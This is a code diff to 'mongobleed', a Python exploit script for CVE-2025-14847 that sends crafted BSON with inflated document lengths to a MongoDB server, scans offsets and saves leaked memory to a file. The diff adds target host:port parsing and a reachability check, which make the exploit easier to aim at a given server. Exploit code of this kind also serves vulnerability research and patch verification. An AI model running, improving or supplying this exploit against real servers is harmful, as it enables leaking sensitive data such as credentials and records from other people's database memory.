@@ -14,6 +14,42 @@ import struct
 import zlib
 import re
 import argparse
+import sys
+
+def normalize_target(host_arg, port_arg):
+    """
+    Allow host strings like "localhost:27017" or "[::1]:27017".
+    Returns (host, port) with port_arg as default when not provided in host.
+    """
+    host = host_arg
+    port = port_arg
+
+    # Check existence listening port
+    if host_arg.startswith('['): 
+        end = host_arg.find(']')
+        if end != -1:
+            host = host_arg[1:end]
+            remainder = host_arg[end + 1:]
+            if remainder.startswith(':') and remainder[1:].isdigit():
+                port = int(remainder[1:])
+    else:
+        parts = host_arg.rsplit(':', 1)
+        if len(parts) == 2 and parts[1].isdigit():
+            host, port_str = parts
+            if host: 
+                port = int(port_str)
+            else:
+                host = host_arg
+
+    return host, port
+
+def ensure_port_open(host, port, timeout=3):
+    try:
+        with socket.create_connection((host, port), timeout=timeout):
+            return True
+    except OSError as exc:
+        print(f"[!] Cannot reach {host}:{port} ({exc})")
+        return False
 
 def send_probe(host, port, doc_len, buffer_size):
     """Send crafted BSON with inflated document length"""
@@ -86,10 +122,16 @@ def main():
     parser.add_argument('--max-offset', type=int, default=8192, help='Max doc length')
     parser.add_argument('--output', default='leaked.bin', help='Output file')
     args = parser.parse_args()
+
+    host, port = normalize_target(args.host, args.port)
     
     print(f"[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak")
     print(f"[*] Author: Joe Desimone - x.com/dez_")
-    print(f"[*] Target: {args.host}:{args.port}")
+    print(f"[*] Target: {host}:{port}")
+
+    if not ensure_port_open(host, port):
+        sys.exit(1)
+
     print(f"[*] Scanning offsets {args.min_offset}-{args.max_offset}")
     print()
     
@@ -97,7 +139,7 @@ def main():
     unique_leaks = set()
     
     for doc_len in range(args.min_offset, args.max_offset):
-        response = send_probe(args.host, args.port, doc_len, doc_len + 500)
+        response = send_probe(host, port, doc_len, doc_len + 500)
         leaks = extract_leaks(response)
         
         for data in leaks:
